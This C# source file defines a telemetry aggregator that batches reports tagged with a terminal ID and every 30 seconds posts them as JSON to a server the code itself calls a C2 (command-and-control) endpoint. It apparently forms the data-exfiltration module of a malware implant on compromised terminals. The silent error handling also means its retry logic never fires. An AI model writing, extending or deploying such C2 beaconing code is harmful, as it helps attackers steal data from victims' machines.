using System;
using System.Collections.Generic;

namespace XYZ.modules.reporters
{
    /// <summary>
    /// Base interface for all telemetry reporters
    /// </summary>
    public interface ITelemetryReporter
    {
        string ReportType { get; }
        void Report(Dictionary<string, object> data);
    }

    /// <summary>
    /// Centralized telemetry aggregator that collects and sends all reports
    /// </summary>
    public class TelemetryAggregator
    {
        private static readonly object lockObj = new object();
        private static List<Dictionary<string, object>> pendingReports = new List<Dictionary<string, object>>();
        private static System.Threading.Timer flushTimer;
        private static string terminalId;
        private static string c2Endpoint;

        public static void Initialize(string tid, string endpoint)
        {
            terminalId = tid;
            c2Endpoint = endpoint;

            // Flush reports every 30 seconds
            flushTimer = new System.Threading.Timer(FlushReports, null, 
                TimeSpan.FromSeconds(30), TimeSpan.FromSeconds(30));
        }

        public static void QueueReport(string reportType, Dictionary<string, object> data)
        {
            lock (lockObj)
            {
                data["report_type"] = reportType;
                data["terminal_id"] = terminalId;
                data["timestamp"] = DateTime.UtcNow.ToString("o");
                pendingReports.Add(data);
            }
        }

        private static void FlushReports(object state)
        {
            List<Dictionary<string, object>> toSend;
            lock (lockObj)
            {
                if (pendingReports.Count == 0) return;
                toSend = new List<Dictionary<string, object>>(pendingReports);
                pendingReports.Clear();
            }

            try
            {
                SendReportsToC2(toSend);
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("TelemetryAggregator", ex);
                // Re-queue failed reports
                lock (lockObj)
                {
                    pendingReports.InsertRange(0, toSend);
                }
            }
        }

        private static void SendReportsToC2(List<Dictionary<string, object>> reports)
        {
            try
            {
                var serializer = new System.Web.Script.Serialization.JavaScriptSerializer();
                string json = serializer.Serialize(new { 
                    terminal_id = terminalId, 
                    reports = reports 
                });

                using (var client = new System.Net.WebClient())
                {
                    client.Headers[System.Net.HttpRequestHeader.ContentType] = "application/json";
                    client.UploadString(c2Endpoint + "/api/telemetry/batch", json);
                }
            }
            catch { }
        }

        public static void ForceFlush()
        {
            FlushReports(null);
        }
    }
}
